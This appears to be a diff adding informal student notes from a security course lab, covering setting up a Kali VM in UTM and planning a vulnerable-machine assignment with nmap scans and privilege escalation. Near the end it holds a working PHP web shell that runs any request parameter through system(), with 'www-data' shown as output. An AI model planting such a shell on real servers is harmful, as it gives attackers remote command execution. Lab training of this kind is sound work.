@@ -1,0 +1,40 @@
+First VM:
+Scan ports using nmap, poke on website, see error, .... Or whatever
+
+Don't make root password root. 
+
+Pick a vulnerability. (not super ambitous for this round)
+
+Goal of first assignment: Build VM, make sure environment setup so we can do a VM. 
+
+If I'm able to log in but not as root, if can execute some limited things -- how can I get to root privileges from here. 
+
+First step: able to execute some UNIX commands somehow....
+
+
+
+
+UTM VM,
+
+kali.... .iso (disk img file)
+
+c_d/db points to kali.iso 
+considered to be cd to not be writable
+cd/dvd-> kali….installer.iso (fix)?
+
+
+Download installer iso now. need ~1/2 hour
+
+
+If use ' in bash, deactivates special characters ex. ?
+webshell.php:
+<?php
+    if (isset($_REQUEST['command'])) {
+        system($_REQUEST['command']);
+    }
+?>
+</pre>
+www-data
+</pre>
+
+
